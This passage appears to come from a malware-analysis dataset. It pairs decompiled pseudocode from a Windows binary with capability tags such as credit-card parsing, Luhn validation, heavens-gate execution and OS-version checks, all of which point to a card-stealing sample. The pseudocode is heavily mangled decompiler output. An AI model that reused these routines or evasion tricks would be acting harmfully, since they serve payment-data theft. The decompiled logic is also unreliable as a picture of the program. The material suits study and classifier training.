pcbBuffer = 0x104;\n    uVar2 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    if (uVar2 == 0) {\n        return NULL;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    if ((0 < uVar2) && (uVar2 < 1)) {\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        uVar1 = uVar2 + in_AF * '\\x06';\n        pcVar4 = uVar2 & 0xffff0000 | CONCAT11((uVar2 >> 8) + in_AF, uVar1) & 0xff0f;\n        if (extraout_ECX == 0) {\n            pcVar4[-0x48] = pcVar4[-0x48] << 1;\n            *pcVar4 = *pcVar4 + (uVar1 & 0xf);\n            *(unaff_EDI + 0x5e) = *(unaff_EDI + 0x5e) + unaff_BL;\n            return pcVar4;\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &var_114h, &var_4h, &var_31ch, &var_8h, &var_10h);\n    if (iVar3 == 0) {\n        return NULL;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&var_114h, arg_8h);\n    if (iVar3 != 0) {\n        pcVar4 = (unaff_retaddr & 0xffff0000 | CONCAT11(*extraout_ECX_00, unaff_retaddr)) - 0x75;\n        *pcVar4 = *pcVar4 + unaff_retaddr;\n        pcVar4 = in(0x5d);\n        return pcVar4;\n    }\n    return NULL;\n}\n",
        "token_count": 1107
    },
    "00404d40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00404d40(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint *unaff_EBP;\n    bool bVar5;\n    uint uStackY8;\n    \n    iVar2 = fcn.004011c0(0x411260);\n    bVar5 = (POPCOUNT(iVar2 + 1U & 0xff) & 1U) != 0;\n    if (iVar2 + 1U == 0) {\n        return 0;\n    }\n    if ((bVar5) && (!bVar5)) {\n        puVar4 = &stack0xfffffffc;\n        cVar1 = '\\x1e';\n        do {\n            unaff_EBP = unaff_EBP + -1;\n            puVar4 = puVar4 + -1;\n            *puVar4 = *unaff_EBP;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar3 = in(0x78);\n        return uVar3;\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    return 1;\n}\n",
        "token_count": 264
    },
    "00401440": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004015ae) overlaps instruction at (ram,0x004015ac)\n// \n// WARNING: Removing unreachable block (ram,0x004014fd)\n\nvoid fcn.00401440(void)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint16_t uVar3;\n    int16_t iVar4;\n    int32_t in_EAX;\n    uint *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    char *pcVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    char extraout_CL;\n    char *extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint8_t extraout_DL;\n    ushort extraout_DX;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint8_t *unaff_EBX;\n    uint32_t unaff_EBP;\n    ushort uVar11;\n    uint *unaff_EDI;\n    uint *puVar12;\n    int16_t in_SS;\n    bool bVar13;\n    uint8_t in_AF;\n    bool bVar14;\n    bool in_SF;\n    char cVar15;\n    uchar uVar16;\n    char cVar17;\n    bool bVar18;\n    float10 fVar19;\n    unkbyte6 Var20;\n    uchar uVar21;\n    ushort uVar22;\n    uchar uVar23;\n    uchar uVar24;\n    unkbyte3 Var25;\n    uchar in_stack_ffffffdc;\n    uchar uVar26;\n    uchar in_stack_ffffffdd;\n    ushort in_stack_ffffffde;\n    uchar uVar27;\n    uchar uVar28;\n    uchar uVar29;\n    uint in_stack_fffffff0;\n    \n    if ((in_SF) || (!in_SF)) {\n        in_stack_fffffff0 = 10;\n    }\n    puVar5 = in_EAX + -0x1bf31dd6;\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    fcn.00402fa0(0x407010, 9, 0x411274, in_stack_fffffff0);\n    iVar6 = fcn.00402fa0(0x407010, 9, 0x411280, 0x12);\n    cVar17 = SBORROW4(unaff_EDI, iVar6);\n    cVar15 = unaff_EDI - iVar6 < 0;\n    uVar26 = 0xba;\n    uVar27 = 0x14;\n    uVar11 = 0x40;\n    uVar7 = fcn.00402fa0(0x407010, 9, 0x411294, 4);\n    if ((cVar15) || (!cVar15)) {\n        uVar26 = 0xc;\n        uVar27 = 0;\n        uVar11 = 0;\n        in_stack_ffffffdc = 0x98;\n        in_stack_ffffffdd = 0x12;\n        in_stack_ffffffde = 0x41;\n    }\n    else {\n        cVar17 = uVar7 + 'j';\n        cVar15 = cVar17 + *extraout_ECX;\n        cVar17 = SCARRY1(cVar17, *extraout_ECX) != SCARRY1(cVar15, 0x6797f395 < uVar7);\n        cVar15 = cVar15 + (0x6797f395 < uVar7) < '\\0';\n    }\n    uVar22 = 0x40;\n    Var20 = fcn.00402fa0(0x407010, 9, CONCAT22(in_stack_ffffffde, CONCAT11(in_stack_ffffffdd, in_stack_ffffffdc)), \n                         CONCAT22(uVar11, CONCAT11(uVar27, uVar26)));\n    uVar11 = Var20 >> 0x20;\n    puVar12 = unaff_EDI;\n    if ((cVar17 == cVar15) && (uVar22 = uVar11,  cVar17 != cVar15)) {\n        out(0xc4, Var20);\n        puVar12 = unaff_EDI + 1;\n        *unaff_EDI = Var20;\n    }\n    fcn.00402fa0(0x407010, 9, 0x4112a4, 7);\n    uVar2 = unaff_EBX >> 8;\n    bVar13 = false;\n    bVar14 = (extraout_DL ^ uVar2 | 0x67) == 0;\n    uVar27 = 0;\n    uVar28 = 0;\n    fcn.00402fa0(0x407010, 9, 0x4112ac, 0xb);\n    uVar26 = SUB41(unaff_EBX, 0);\n    if ((bVar13 || bVar14) || (!bVar13 && !bVar14)) {\n        uVar22 = 0x41;\n        fcn.00402fa0(0x407010, 9, 0x4112b8, 0xc);\n        uVar27 = unaff_EBX >> 0x10;\n        uVar28 = unaff_EBX >> 0x18;\n    }\n    else {\n        *puVar12 = *puVar5;\n        unaff_EBP = 0x6ae181d0;\n        *0x6a004122 = *0x6a004122 | 0x6ae181d0;\n        uVar2 = (extraout_ECX_00 >> 8) + 0x12;\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        uVar3 = CONCAT11('A' - in_AF, uVar2 + in_AF * -6) & 0xff0f;\n        pcVar8 = (unaff_EBX & 0xffff0000 | CONCAT11(0xdf, uVar26)) + 0x665320c4;\n        *pcVar8 = *pcVar8 + ((uVar3 - *(uVar3 | 0x6a000000)) - in_AF);\n        uVar26 = extraout_ECX_00 >> 0x10;\n        uVar2 = extraout_ECX_00 >> 0x18;\n        puVar5 = in_EAX + -0x1bf31dd2;\n    }\n    fcn.00402fa0(0x407010, 9, 0x4112c4, 8);\n    uVar7 = CONCAT22(uVar22, in_SS);\n    uVar23 = 0x47;\n    uVar24 = 0;\n    uVar11 = 0;\n    uVar16 = 0xcc;\n    uVar21 = 0x12;\n    uVar22 = 0x41;\n    iVar4 = in_SS;\n    while( true ) {\n        fcn.00402fa0(0x407010, 9, CONCAT22(uVar22, CONCAT11(uVar21, uVar16)), CONCAT22(uVar11, CONCAT11(uVar24, uVar23))\n                    );\n        bVar13 = false;\n        bVar18 = false;\n        bVar14 = in_SS == 0;\n        uVar16 = 0x10;\n        uVar21 = 0x70;\n        uVar22 = 0x40;\n        uVar23 = 0xde;\n        uVar24 = 0x15;\n        uVar9 = fcn.00402fa0(0x407010, 9, 0x4112dc, 0x18);\n        if (bVar13 || bVar14) break;\n        uVar11 = SUB42(puVar5, 0);\n        puVar5 = puVar5 & 0xffff;\n        if (!bVar13 && !bVar14) break;\n        if (!bVar18) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        pcVar8 = uVar9 ^ 0x6e;\n        *pcVar8 = *pcVar8 + pcVar8;\n    }\n    fcn.00402fa0(0x407010, 9, 0x4112f4, 0x25);\n    uVar16 = extraout_DX + (extraout_DX >> 8) < '\\0';\n    uVar21 = 10;\n    uVar23 = 0;\n    uVar11 = 0;\n    do {\n        fVar19 = fcn.00402fa0(0x407010, 9, 0x41131c, CONCAT22(uVar11, CONCAT11(uVar23, uVar21)));\n        if ((!uVar16) && (uVar16)) {\n            *(uVar7 + 0x1c) = fVar19;\n            uVar7 = uVar7 + 5;\n        }\n        uVar9 = fcn.00402fa0(0x407010, 9, 0x411328, 0xc);\n        bVar13 = uVar7 < uVar9;\n        uVar16 = uVar7 - uVar9 < 0;\n        bVar14 = (POPCOUNT(uVar7 - uVar9 & 0xff) & 1U) == 0;\n        uVar21 = 0x34;\n        uVar23 = 0x13;\n        uVar11 = 0x41;\n        fcn.00402fa0(0x407010, 9, 0x411334, 0xd);\n        if ((bVar14) || (!bVar14)) break;\n        segment(iVar4, *0x10 + -0x28);\n        if (bVar13) {\n            *0xb7bc9ea5 = *0xb7bc9ea5 + extraout_CL;\n            goto code_r0x004016c0;\n        }\n    } while (bVar14);\n    fcn.00402fa0(0x407010, 9, 0x411344, 6);\ncode_r0x004016c0:\n    fcn.00402fa0(0x407010, 9, 0x41134c, 5);\n    fcn.00402fa0(0x407010, 9, 0x411354, 0xd);\n    fcn.00402fa0(0x407010, 9, 0x411364, 0x19);\n    fcn.00402fa0(0x407010, 9, 0x411380, 0xf);\n    fcn.00402fa0(0x407010, 9, 0x411390, 0xe);\n    fcn.00402fa0(0x407010, 9, 0x4113a0, 0xb);\n    fcn.00402fa0(0x407010, 9, 0x4113ac, 0xb);\n    puVar1 = CONCAT13(uVar28, CONCAT12(uVar27, CONCAT11(uVar2, uVar26)));\n    fcn.00402fa0(0x407010, 9, 0x4113b8, 0xb);\n    fcn.00402fa0(0x407010, 9, 0x4113c4, 10);\n    uVar26 = 0;\n    Var25 = 0x407010;\n    fcn.00402fa0(0x407010, 9, 0x4113d0, 0xc);\n    *puVar1 = *puVar1 & 0xc3;\n    bVar13 = *(extraout_EDX + 0xe) < unaff_EBP;\n    uVar10 = fcn.00402fa0(0x407010, 9, 0x4113dc, CONCAT13(uVar26, Var25));\n    if ((!bVar13) && (bVar13)) {\n        out(0xbd, uVar10);\n        return;\n    }\n    fcn.00402fa0(0x407010, 9, 0x4113ec, 0x11);\n    fcn.00402fa0(0x407010, 9, 0x411400, 0x13);\n    fcn.00402fa0(0x407010, 9, 0x411414, 0x14);\n    fcn.00402fa0(0x407010, 9, 0x411428, 0x33);\n    uVar22 = 10;\n    uVar24 = 0;\n    uVar29 = 0;\n    uVar28 = 0x5c;\n    uVar16 = 0x14;\n    uVar21 = 0x41;\n    uVar23 = 0;\n    uVar26 = 9;\n    uVar11 = 0;\n    uVar27 = 0;\n    while( true ) {\n        fcn.00402fa0(0x407010, CONCAT13(uVar27, CONCAT21(uVar11, uVar26)), \n                     CONCAT13(uVar23, CONCAT12(uVar21, CONCAT11(uVar16, uVar28))), \n                     CONCAT13(uVar29, CONCAT12(uVar24, uVar22)));\n        fcn.00402fa0(0x407010, 9, 0x411468, 4);\n        iVar4 = fcn.00402fa0(0x407010, 9, 0x41146c, 5);\n        cVar17 = SCARRY2(iVar4, 1);\n        cVar15 = iVar4 + 1 < 0;\n        bVar13 = iVar4 == -1;\n        uVar22 = 6;\n        uVar24 = 0;\n        uVar29 = 0;\n        uVar28 = 0x74;\n        uVar16 = 0x14;\n        uVar21 = 0x41;\n        uVar23 = 0;\n        uVar26 = 9;\n        uVar11 = 0;\n        uVar27 = 0;\n        fcn.00402fa0(0x407010, 9, 0x411474, 6);\n        if ((bVar13 || cVar17 != cVar15) || (!bVar13 && cVar17 == cVar15)) break;\n        if (extraout_ECX_01 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(extraout_EDX_00 + 9) = *(extraout_EDX_00 + 9);\n    }\n    fcn.00402fa0(0x407010, 9, 0x4114a8, 0x2a);\n    fcn.00402fa0(0x407010, 9, 0x4114d4, 0xb);\n    return;\n}\n",
        "token_count": 3316
    },
    "00401a00": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401ced) overlaps instruction at (ram,0x00401ce9)\n// \n\nvoid fcn.00401a00(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    ushort extraout_CX;\n    uint16_t uVar7;\n    char extraout_CH;\n    uint8_t extraout_CH_02;\n    uint8_t uVar8;\n    int32_t extraout_ECX;\n    char extraout_CH_00;\n    char extraout_CH_01;\n    int32_t extraout_ECX_00;\n    uchar *extraout_ECX_01;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint32_t unaff_EBX;\n    char **unaff_ESI;\n    uchar *unaff_EDI;\n    uchar *puVar9;\n    bool bVar10;\n    bool bVar11;\n    uchar uVar12;\n    bool bVar13;\n    unkbyte6 Var14;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    uint arg_14h;\n    uint uVar15;\n    \n    iVar4 = fcn.00402fa0(0x407010, 9, 0x411260, 0x11);\n    bVar11 = ((unaff_EBX ^ 0x70c5) - iVar4 >> 8 | extraout_CX >> 8) - extraout_CX < '\\0';\n    uVar15 = 0x401a67;\n    fcn.00402fa0(0x407010, 9, 0x41147c, 0xf);\n    if ((bVar11) || (!bVar11)) {\n        uVar15 = 0x1a;\n        in_stack_ffffffdc = 0x41148c;\n        in_stack_ffffffd8 = 9;\n    }\n    *(extraout_EDX + 9) = *(extraout_EDX + 9) + extraout_CH;\n    fcn.00402fa0(0x407010, in_stack_ffffffd8, in_stack_ffffffdc, uVar15);\n    bVar11 = extraout_ECX + -0x5354 < 0;\n    uVar15 = 0x401ab3;\n    fcn.00402fa0(0x407010, 9, 0x4114e0, 10);\n    if ((bVar11) || (!bVar11)) {\n        uVar15 = 0xb;\n        in_stack_ffffffdc = 0x4114ec;\n        in_stack_ffffffd8 = 9;\n    }\n    in(extraout_EDX_00);\n    *(extraout_EDX_00 + 9) = *(extraout_EDX_00 + 9) + extraout_CH_00;\n    fcn.00402fa0(0x407010, in_stack_ffffffd8, in_stack_ffffffdc, uVar15);\n    fcn.00402fa0(0x407010, 9, 0x4114f8, 8);\n    fcn.00402fa0(0x407010, 9, 0x411500, 9);\n    bVar11 = false;\n    uVar12 = 0;\n    bVar10 = extraout_CH_01 == unaff_EBX;\n    fcn.00402fa0(0x407010, 9, 0x41150c, 9);\n    if ((!bVar11 && !bVar10) && (bVar11 || bVar10)) {\n        uVar12 = 0;\n    }\n    uVar15 = 0x401b6c;\n    fcn.00402fa0(0x407010, 9, 0x411518, 9);\n    if ((uVar12) || (!uVar12)) {\n        uVar15 = 0xc;\n    }\n    fcn.00402fa0(0x407010, 9, 0x411524, uVar15);\n    fcn.00402fa0(0x407010, 9, 0x411530, 3);\n    arg_14h = 0x411534;\n    uVar15 = 9;\n    fcn.00402fa0(0x407010, 9, 0x411534, 10);\n    fcn.00402fa0(0x407010, 9, 0x411540, 0x40);\n    fcn.00402fa0(0x407010, 9, 0x411580, 0xc);\n    fcn.00402fa0(0x407010, 9, 0x41158c, 0xb);\n    iVar5 = fcn.00402fa0(0x407010, 9, 0x411598, 4);\n    iVar5 = extraout_ECX_00 - iVar5;\n    uVar7 = iVar5 & 0xff00 | iVar5 ^ iVar5 >> 8 | 0x3d00 | unaff_EBX;\n    uVar2 = uVar7;\n    uVar3 = uVar7 >> 8;\n    bVar11 = uVar3 < uVar2;\n    bVar13 = SBORROW1(uVar3, uVar2);\n    bVar10 = uVar3 == uVar2;\n    Var14 = fcn.00402fa0(0x407010, 9, 0x41159c, 4);\n    if ((bVar13) || (!bVar13)) {\n        arg_14h = 0x4115a0;\n        uVar15 = 9;\n    }\n    else {\n        puVar9 = unaff_EDI + 1;\n        uVar12 = in(Var14 >> 0x20);\n        *unaff_EDI = uVar12;\n        unaff_EBX = CONCAT31(unaff_EBX >> 8, 0xbc);\n        unaff_EDI = puVar9;\n        if (!bVar11 && !bVar10) {\n            uVar6 = Var14 + 1;\n            uVar3 = uVar6;\n            uVar8 = extraout_ECX_01 >> 8;\n            uVar2 = uVar3 + uVar8;\n            *(unaff_EBX + 0x665320c4) =\n                 *(unaff_EBX + 0x665320c4) + uVar2 + *(uVar6 & 0xffffff00 | uVar2) + CARRY1(uVar3, uVar8);\n            goto code_r0x00401d3f;\n        }\n    }\n    uVar7 = CONCAT11(*extraout_ECX_01, unaff_EBX);\n    uVar6 = fcn.00402fa0(0x407010, 0x56, uVar15, arg_14h);\n    while( true ) {\n        bVar11 = false;\n        bVar13 = false;\n        bVar10 = (uVar6 + uVar7 | 0x11a9) == 0;\n        uVar2 = fcn.00402fa0(0x407010, 9, 0x4115ac, 4);\n        puVar9 = unaff_EDI;\n        if ((bVar11 || bVar10) || (!bVar11 && !bVar10)) break;\n        if (!bVar13) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        pcVar1 = *unaff_ESI;\n        uVar2 = pcVar1 + *pcVar1 + CARRY1(uVar2, extraout_CH_02);\n        uVar6 = pcVar1 & 0xffffff00 | uVar2;\n        pcVar1 = (unaff_EBX & 0xffff0000 | uVar7) + 0x525020c4;\n        *pcVar1 = *pcVar1 + uVar2;\n        unaff_ESI = unaff_ESI + 1;\n    }\ncode_r0x00401d3f:\n    fcn.00402fa0(0x407010, 9, 0x4115b0, 9);\n    bVar10 = false;\n    bVar11 = false;\n    uVar15 = 9;\n    fcn.00402fa0(0x407010, 9, 0x4115bc, 0x16);\n    if ((!bVar10 && !bVar11) && (bVar10 || bVar11)) {\n        *(puVar9 + 0x6a) = *(puVar9 + 0x6a) - &stack0xffffffe0;\n    }\n    fcn.00402fa0(0x407010, 9, 0x4115d4, uVar15);\n    return;\n}\n",
        "token_count": 1994
    },
    "00401dc0": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401f7a) overlaps instruction at (ram,0x00401f79)\n// \n// WARNING: Removing unreachable block (ram,0x00401f7a)\n\nvoid fcn.00401dc0(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint16_t uVar3;\n    uint32_t *in_EAX;\n    uint uVar4;\n    uint8_t extraout_CH;\n    uint8_t extraout_CH_00;\n    uint8_t extraout_CH_01;\n    int32_t extraout_ECX;\n    ushort extraout_DX;\n    char *pcVar5;\n    uint8_t unaff_BL;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint16_t in_SS;\n    bool in_CF;\n    bool bVar6;\n    uint8_t uVar7;\n    uint8_t in_AF;\n    bool bVar8;\n    uchar uVar9;\n    char cVar10;\n    char cVar11;\n    float10 fVar12;\n    ulong uVar13;\n    uint32_t uVar14;\n    uint arg_10h;\n    uint arg_14h;\n    \n    if ((!in_CF) && (in_CF)) {\n        if (&stack0xfffffff4 < *in_EAX || in_EAX == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        *(unaff_EDI + 0x6a) = *(unaff_EDI + 0x6a) - &stack0xfffffff0;\n        fcn.00402fa0(0x407010, 9, 0x4115d4, unaff_EDI);\n        return;\n    }\n    uVar3 = fcn.00402fa0(0x407010, 9, 0x4115dc, 0x20);\n    bVar6 = false;\n    bVar8 = (CONCAT31(extraout_CH & 0xb, 0xc) & (unaff_EDI & uVar3) + 0xaf70) == 0;\n    fcn.00402fa0(0x407010, 9, 0x4115fc, 0x26);\n    if ((!bVar6 && !bVar8) && (bVar6 || bVar8)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    arg_14h = 0x411624;\n    arg_10h = 9;\n    uVar14 = 0x407010;\n    fcn.00402fa0(0x407010, 9, 0x411624, 8);\n    uVar7 = 0;\n    bVar6 = (POPCOUNT(extraout_CH_00 ^ unaff_BL) & 1U) == 0;\n    uVar13 = fcn.00402fa0(0x407010, 9, 0x41162c, 0x19);\n    pcVar5 = uVar13 >> 0x20;\n    uVar4 = uVar13;\n    if ((bVar6) || (!bVar6)) {\n        arg_14h = 0x411648;\n        arg_10h = 9;\n    }\n    else {\n        puVar2 = unaff_ESI + 1;\n        out(*unaff_ESI, uVar13 >> 0x20);\n        uVar7 = in_AF;\n        do {\n            cVar10 = uVar4 >> 8;\n            uVar7 = 9 < (uVar4 & 0xf) | uVar7;\n            uVar4 = CONCAT31(CONCAT21(uVar4 >> 0x10, cVar10 - uVar7), -uVar7);\n            unaff_ESI = puVar2;\n        } while (uVar7 || cVar10 == *pcVar5);\n    }\n    piVar1 = unaff_EDI + pcVar5 * 2;\n    *piVar1 = (*piVar1 + 0x7b) - uVar7;\n    *(extraout_ECX + 0x6a) = uVar4;\n    pcVar5[9] = pcVar5[9] + (extraout_ECX + 1 >> 8);\n    fcn.00402fa0(0x407010, uVar14 & 0xffff0000 | in_SS, arg_10h, arg_14h);\n    fcn.00402fa0(0x407010, 9, 0x411654, 0x12);\n    uVar9 = &stack0xfffffff0 < 0;\n    bVar6 = *0x10 == 0x10;\n    fcn.00402fa0(0x407010, 9, 0x411668, 0x12);\n    if ((!bVar6) && (bVar6)) {\n        out(*unaff_ESI, extraout_DX);\n    }\n    fVar12 = fcn.00402fa0(0x407010, 9, 0x41167c, 2);\n    if ((!uVar9) && (uVar9)) {\n        *(unaff_EDI + 7) = fVar12;\n        unaff_EDI = unaff_EDI + 5;\n    }\n    uVar13 = fcn.00402fa0(0x407010, 9, 0x411680, 8);\n    cVar11 = '\\0';\n    cVar10 = ((uVar13 >> 0x20 & 0xffffff00 | extraout_CH_01) & uVar13) < 0;\n    uVar4 = fcn.00402fa0(0x407010, 9, 0x411688, 8);\n    if ((cVar11 == cVar10) && (cVar11 != cVar10)) {\n        out(0xc4, uVar4);\n        *unaff_EDI = uVar4;\n    }\n    fcn.00402fa0(0x407010, 9, 0x411690, 6);\n    fcn.00402fa0(0x407010, 9, 0x411698, 7);\n    fcn.00402fa0(0x407010, 9, 0x4116a0, 7);\n    fcn.00402fa0(0x407010, 9, 0x4116a8, 6);\n    bVar6 = false;\n    uVar4 = fcn.00402fa0(0x407010, 9, 0x4116b0, 0x25);\n    if ((!bVar6) && (bVar6)) {\n        out(0xbd, uVar4);\n        return;\n    }\n    fcn.00402fa0(0x407010, 9, 0x4116d8, 8);\n    return;\n}\n",
        "token_count": 1553
    },
    "004024b0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004024f9) overlaps instruction at (ram,0x004024f8)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x004024e1)\n// WARNING: Removing unreachable block (ram,0x004024ed)\n// WARNING: Removing unreachable block (ram,0x004024f1)\n// WARNING: Removing unreachable block (ram,0x004024fe)\n\nbool fcn.004024b0(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    pcbData = 0x104;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x4116b0, 0x4116d8, &pdwType, &pvData, &pcbData);\n    if (iVar2 != 0) {\n        return false;\n    }\n    if ((-1 < iVar2) && (-1 >= iVar2)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)();\n    if (iVar2 != 6) {\n        return iVar2 == 7;\n    }\n    return true;\n}\n",
        "token_count": 457
    },
    "004033c0": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.004033c0(void)\n\n{\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    uint uStack128;\n    \n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((!SBORROW4(var_90h, 5)) && (SBORROW4(var_90h, 5))) {\n        return uStack128;\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 149
    },
    "00402ca0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e74) overlaps instruction at (ram,0x00402e73)\n// \n\nvoid fcn.00402ca0(void)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    code *pcVar7;\n    int32_t **extraout_ECX;\n    uint8_t uVar8;\n    code *pcVar9;\n    uchar *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uchar uVar13;\n    ulong uVar14;\n    uchar uVar15;\n    code *pcStack692;\n    uint uStack688;\n    uint uStack684;\n    uint uStack680;\n    uchar *puStack676;\n    uint uStack672;\n    uint uStack668;\n    uint uStack664;\n    uchar *puStack660;\n    uint var_25fh;\n    uchar s;\n    uint var_15bh;\n    uint var_58h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar10 = &stack0xfffffffc;\n    fcn.00401dc0();\n    iVar4 = fcn.004024b0();\n    if (iVar4 != 0) {\n        puVar11 = &fcn.00402ca0::var_25fh;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar11 = 0;\n            puVar11 = puVar11 + 1;\n        }\n        *puVar11 = 0;\n        *(puVar11 + 2) = 0;\n        iVar4 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n        if (iVar4 != 0) {\n            if ((-1 < iVar4) && (-1 >= iVar4)) {\n                *(puVar11 + 3U | &stack0xfffffffc) = iVar4;\n            }\n            fcn.00403ac0();\n            s = 0;\n            puVar11 = &fcn.00402ca0::var_15bh;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar11 = 0;\n                puVar11 = puVar11 + 1;\n            }\n            *puVar11 = 0;\n            *(puVar11 + 2) = 0;\n            puStack660 = &stack0xfffffea0;\n            uStack664 = 0x402daa;\n            (*_sym.imp.MSVCRT.dll_sprintf)();\n            var_14h = 0;\n            pcVar9 = _sym.imp.USER32.dll_EnumWindows;\n            puVar11 = _sym.imp.KERNEL32.dll_Sleep;\n            do {\n                puVar12 = puVar10 + -0x58;\n                for (iVar4 = 0x11; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar12 = 0;\n                    puVar12 = puVar12 + 1;\n                }\n                *(puVar10 + -0x28) = 0;\n                *(puVar10 + -0x10) = 0;\n                *(puVar10 + -0xc) = 0;\n                *(puVar10 + -0x58) = 0x44;\n                *(puVar10 + -8) = 0;\n                *(puVar10 + -0x2c) = 1;\n                *(puVar10 + -4) = 0;\n                puStack660 = NULL;\n                uStack664 = 0;\n                uStack668 = 0;\n                uStack672 = 0;\n                puStack676 = puVar10 + -0x15c;\n                uStack680 = 0;\n                uStack684 = 0x402e22;\n                iVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n                uVar13 = iVar4 == 0;\n                if (uVar13) {\n                    return;\n                }\n                if (uVar13) {\ncode_r0x00402e44:\n                    uStack684 = 3000;\n                    uStack688 = 0x402e4b;\n                    (*puVar11)();\n                }\n                else {\n                    if (!uVar13) goto code_r0x00402e44;\n                    uVar13 = 1;\n                    *puVar12 = *puVar11;\n                    pcVar9 = pcVar9 & 0xffff0000 | CONCAT11(0xdf, pcVar9);\n                    puVar10 = 0x68e181d0;\n                    puVar11 = puVar11 + 1;\n                    puVar12 = puVar12 + 1;\n                }\n                uStack688 = *(puVar10 + -8);\n                pcStack692 = fcn.00402ba0;\n                uVar14 = (*pcVar9)();\n                if ((uVar13) || (uVar15 = puVar12 >> 0x18,  !uVar13)) {\n                    uVar15 = 0;\n                    pcVar7 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n                }\n                else {\n                    uVar2 = in(uVar14 >> 0x20);\n                    *puVar12 = uVar2;\n                    if (&stack0xfffffd4c < 1) {\n                        piVar6 = *extraout_ECX;\n                        if (piVar6 != NULL) {\n                            (**(*piVar6 + 8))(piVar6);\n                        }\n                        return;\n                    }\n                    uVar5 = uVar14 ^ 0xdee0ed6d;\n                    piVar6 = uVar5 & 0xffff0000 | uVar5 + (uVar5 >> 8) 